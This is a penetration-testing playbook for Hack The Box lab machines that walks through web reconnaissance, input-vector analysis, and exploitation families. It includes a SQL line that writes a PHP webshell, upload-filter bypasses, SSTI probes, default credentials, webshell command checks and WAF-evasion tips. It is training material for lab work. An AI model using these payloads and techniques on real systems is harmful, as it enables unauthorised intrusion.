# Web Attack Flow

> What to do once you've decided the foothold lives behind a web port.

The default flow is: **fingerprint → map → analyse → exploit → confirm**.

## Step 1 — Fingerprint the stack

Identify the *product* and *version* before doing anything else.

```bash
# Headers and obvious markers
curl -sI http://<ip>/                    # Server, X-Powered-By, Set-Cookie, redirects
whatweb http://<ip>                       # automated stack fingerprinting
nikto -h http://<ip> -o nikto.txt         # check for many obvious issues at once

# In the browser:
#   View-source → script paths, comments, framework hints
#   /robots.txt
#   /sitemap.xml
#   /favicon.ico (compare hash to public favicon DB)
```

Capture:
- HTTP headers (especially `Server:`, `X-Powered-By:`, `Set-Cookie` name).
- Page footer ("Powered by …").
- Version strings in JS / CSS asset paths.
- Cookie names — often reveal the framework (`PHPSESSID`, `JSESSIONID`,
  `_csrf`, `Drupal.tableDrag.showWeight`, `wordpress_logged_in_*`).

If fingerprint maps to a known vulnerable product+version → jump to the
matching skill in `common-exploits/` (e.g. `Drupalgeddon2`, `Tomcat manager
upload`, `Jenkins Groovy RCE`, `OpenNetAdmin RCE`).

## Step 2 — Map content

```bash
# Directory & file fuzz; raft-medium is the right balance of coverage/speed
gobuster dir -u http://<ip>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,html,txt,bak,old,zip,tar.gz \
  -t 50 -o gobuster.txt

# When .git is present, this single check ends the box
curl -s http://<ip>/.git/HEAD              # 200 → use git-dumper
git-dumper http://<ip>/.git ./repo

# vhost discovery (when a hostname has been hinted)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://<ip>/ -H "Host: FUZZ.<box>.htb" \
  -fs <baseline-content-length>
```

Update gobuster wordlist by stack:
- `raft-medium-files-lowercase.txt` — generic
- `directory-list-2.3-medium.txt` — DirBuster classic
- `quickhits.txt` — rapid sanity check on appliances
- `common-php-files.txt` — PHP apps
- `IIS.fuzz.txt` — IIS / .NET

## Step 3 — Analyse the application

For every input vector, ask: *what server-side action does this trigger?*

| Vector | Server-side actions to consider |
|---|---|
| Login form | SQLi, NoSQLi, default creds, user enumeration via timing/error |
| Search form | SQLi, XSS, SSTI |
| Upload form | Unrestricted upload, path traversal in filename, polyglot files |
| URL parameter (`?file=`, `?page=`) | LFI, RFI, path traversal |
| API endpoint | IDOR, mass assignment, JWT abuse |
| Forgot-password | Host header injection, account-takeover via predictable token |
| Admin / ACL boundary | Auth bypass, IDOR, role-tampering |

Open Burp early; **proxy every request** so you can replay them with
modifications without touching the browser.

## Step 4 — Exploit

The five common foothold-from-web families:

### 4a. RCE via known product CVE
Read the exploit code, set parameters, test on disposable VPS first if
possible. Ensure your callback IP/port is reachable.

### 4b. File upload → webshell
- Confirm the upload path is *served* — many apps store files outside
  webroot.
- Bypass extension filters: `.phtml`, `.php5`, `.phar`, `.htaccess`,
  double extensions, null bytes, MIME spoofing.
- Confirm execution by hitting the file directly and reading the response.

### 4c. SQLi → file write → RCE (LAMP only)
```sql
UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/s.php'
```
Requires: `SELECT … INTO OUTFILE` privilege, writable webroot, and DB user
running with FS permissions.

### 4d. SSTI → RCE
- Test with framework-specific payloads (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`).
- Once the engine is identified, escalate to RCE via that engine's
  primitives.

### 4e. Auth bypass / default creds
- Try the exact appliance's documented default first (Sense pattern:
  `pfSense:pfsense`).
- Then `admin:admin`, `admin:password`, `admin:<product>`.

## Step 5 — Confirm execution

```bash
# After every attempted exploit:
curl http://<ip>/<shell>?c=id
curl http://<ip>/<shell>?c=hostname
curl http://<ip>/<shell>?c=whoami
```

Then upgrade to a reverse shell — see `12-shell-stabilization.md`.

## Web-specific dead ends and recoveries

| Symptom | Hypothesis | Test |
|---|---|---|
| Upload "succeeds" but file 404s | File saved outside webroot | Find docroot via LFI / directory listing |
| Reverse shell payload triggers but no callback | Egress filtering | Try TCP/443, TCP/80, TCP/53 |
| Login form returns nothing | JS-driven auth | Capture network tab, replay raw |
| Every request returns the same 200 page | WAF blackholing | Switch User-Agent, add headers |
| Different content from IP vs. hostname | vhost split | Map all known vhosts in /etc/hosts |
| CSRF token rejection on replay | Token is per-request | Pull-then-submit pattern in Burp Macros |

## OPSEC for web phase

- Burp / browser-based testing is loud; default `User-Agent` shouts
  "scanner".
- Don't run wfuzz/ffuf with 100 threads on a box with rate-limiting; you
  will trigger lockout (see Sense — 15 failed attempts → 24h ban).
- Disable `Burp` "Scanner" against unknown apps unless you accept the
  noise.

## Real HTB examples

- **Sense** — appliance default creds + config disclosure (`/changelog.txt`)
  → admin → authenticated RCE.
- **OpenAdmin** — exact-version banner → CVE-2019-17642 RCE → URL-encoded
  payload to defeat WAF-style input filtering.
- **Bashed** — `/dev/phpbash.php` left in webroot; raw RCE from the
  browser.
- **Jeeves** — Jenkins on `:50000`; unauthenticated Groovy script console
  → RCE.
- **Optimum** — HFS 2.3 banner → CVE-2014-6287 → unauthenticated RCE.

## See also

- [01-initial-foothold.md](01-initial-foothold.md)
- [11-exploit-adaptation.md](11-exploit-adaptation.md)
- [../web/](../web/)
- [../common-exploits/](../common-exploits/)
